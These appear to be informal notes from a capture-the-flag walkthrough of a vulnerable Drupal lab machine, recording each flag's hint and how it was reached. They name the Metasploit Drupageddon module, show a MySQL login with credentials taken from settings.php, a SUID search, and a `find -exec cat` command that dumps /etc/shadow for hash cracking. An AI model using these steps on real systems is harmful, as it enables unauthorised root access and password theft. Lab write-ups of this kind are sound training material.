#used metasploit's:
	exploit/multi/http/drupal_drupageddon and got shell
	used shell to get nc shel so i can stablize it

#stablied shell

#got flag1.txt:
	Every good CMS needs a config file - and so do you.

#config of drupal is in sites/default/settings.php

#got flag2:
	Brute force and dictionary attacks aren't the
	only ways to gain access (and you WILL need access).
	What can you do with these credentials?

#also got database user/pass:
      'database' => 'drupaldb',
      'username' => 'dbuser',
      'password' => 'R0ck3t',
      'host' => 'localhost',
      'port' => '',
      'driver' => 'mysql',

#loging in database:
	mysql -u dbuser -p
	password: R0ck3t

#found flag3 in the table node:
	SELECT * FROM node;

#flag3:
	Special PERMS will help FIND the passwd — but you’ll need to -exec that command to work out how to get what’s in the shadow

#used find command and found 'find' in suid:
	find / -perm -u=s 2>/dev/null

#got effective uid of root

#got flag4.txt:
	Can you use this same method to find or access the flag in root?
	Probably. But perhaps it's not that easy.  Or maybe it is?

#flag5.txt:
	Well done!!!!
	Hopefully you've enjoyed this and learned some new skills.
	You can let me know what you thought of this little journey
	by contacting me via Twitter - @DCAU7



#one more way to get root:
	use the command:
	find /etc/shadow -type f -exec cat ‘{}’ \;
	this gives the /etc/shadow file
	can use it to unshadow and crack using john/hashcat

	(btw, flag4 user pass is 'orange')